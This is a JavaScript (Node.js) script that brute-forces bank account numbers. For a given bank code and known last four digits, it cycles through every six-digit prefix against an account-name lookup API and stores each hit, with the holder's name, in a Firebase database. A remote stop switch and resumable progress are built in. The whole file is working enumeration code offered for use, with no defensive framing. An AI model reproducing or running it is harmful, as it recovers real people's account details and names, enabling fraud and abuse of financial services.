import axios from 'axios';
import fs from 'fs';
import admin from 'firebase-admin';
import chalk from 'chalk';
import prettyMs from 'pretty-ms';

const serviceAccount = JSON.parse(process.env.FIREBASE_KEY_JSON);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: 'https://a-b-c-s-default-rtdb.firebaseio.com',
});

const db = admin.database();
const attemptsRef = db.ref('Attempt');
const validRef = db.ref('Valid Account');
const controlRef = db.ref('control');

const BANK_CODE = process.env.BANK_CODE;
const LAST_4_DIGITS = process.env.LAST_4_DIGITS;
const API_URL = process.env.API_URL;
const TOKEN = process.env.API_TOKEN;

let start = 1;
let stop = false;

if (fs.existsSync('state.json')) {
  const state = JSON.parse(fs.readFileSync('state.json', 'utf8'));
  start = state.last || 1;
}

controlRef.child('status').on('value', snapshot => {
  stop = snapshot.val() === 'stop';
});

async function bruteForce() {
  console.log(chalk.green(`\n🚀 Starting from prefix: ${start.toString().padStart(6, '0')}`));
  for (let i = start; i <= 999999; i++) {
    if (stop) {
      console.log(chalk.yellow('⏸️ Stopped by control panel.'));
      saveState(i);
      break;
    }

    const prefix = i.toString().padStart(6, '0');
    const accountNumber = prefix + LAST_4_DIGITS;
    const timestamp = new Date().toISOString();

    try {
      const res = await axios.get(`${API_URL}?account_number=${accountNumber}&bank_code=${BANK_CODE}`, {
        headers: { Authorization: `Bearer ${TOKEN}` }
      });

      const data = res.data;
      await attemptsRef.push({ timestamp, accountNumber, data });

      if (data.status === 200 && data.account_name) {
        await validRef.push({ timestamp, accountNumber, ...data });
        console.log(chalk.green(`[VALID] ${accountNumber} → ${data.account_name}`));
      } else {
        console.log(chalk.gray(`[INVALID] ${accountNumber}`));
      }

    } catch (err) {
      console.log(chalk.red(`[ERROR] ${accountNumber} → Retrying...`));
      i--;
    }

    if (i % 100 === 0) saveState(i);
  }
  console.log(chalk.blueBright('\n🎯 Brute-force finished.'));
}

function saveState(last) {
  fs.writeFileSync('state.json', JSON.stringify({ last }), 'utf8');
}

bruteForce();
